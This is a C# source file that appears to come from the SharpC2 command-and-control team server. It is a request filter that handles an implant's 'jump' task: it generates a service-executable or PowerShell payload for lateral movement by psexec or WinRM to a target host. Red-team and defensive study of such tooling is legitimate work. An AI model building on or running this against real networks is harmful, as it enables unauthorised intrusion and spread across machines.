using Microsoft.AspNetCore.Mvc.Filters;

using SharpC2.API.Request;

using TeamServer.Controllers;
using TeamServer.Interfaces;

namespace TeamServer.Filters;

public class JumpCommandFilter  : IAsyncActionFilter
{
    private readonly IHandlerService _handlers;
    private readonly IPayloadService _payloads;

    public JumpCommandFilter(IHandlerService handlers, IPayloadService payloads)
    {
        _handlers = handlers;
        _payloads = payloads;
    }

    public async Task OnActionExecutionAsync(ActionExecutingContext context, ActionExecutionDelegate next)
    {
        if (context.Controller.GetType() == typeof(TasksController))
        {
            if (context.ActionArguments.TryGetValue("request", out var action))
            {
                if (action is not null)
                {
                    if (action.GetType() == typeof(DroneTaskRequest))
                    {
                        if (action is DroneTaskRequest request)
                        {
                            if (request.DroneFunction.Equals("jump"))
                            {
                                // params[0] == method
                                // params[1] == target
                                // params[2] == handler
                                // jump psexec dc-1 smb

                                // get the handler
                                var handlerName = request.Parameters[2];
                                var handler = _handlers.GetHandler(handlerName);

                                if (handler is null)
                                    throw new ArgumentException("Handler not found");
                                
                                // payload format
                                var method = request.Parameters[0].ToLowerInvariant();
                                var format = method switch
                                {
                                    "psexec" => PayloadFormat.ServiceExe,
                                    "winrm" => PayloadFormat.PowerShell,
                                    _ => throw new ArgumentException("Invalid jump method")
                                };

                                // generate a payload
                                var payload = await _payloads.GeneratePayload(handler, format, $"jump {method}");

                                if (payload is null || payload.Length == 0)
                                    throw new ArgumentException("Failed to generate payload");

                                request.Artefact = payload;
                            }
                        }
                    }
                }
            }
        }

        // go to next
        await next();
    }
}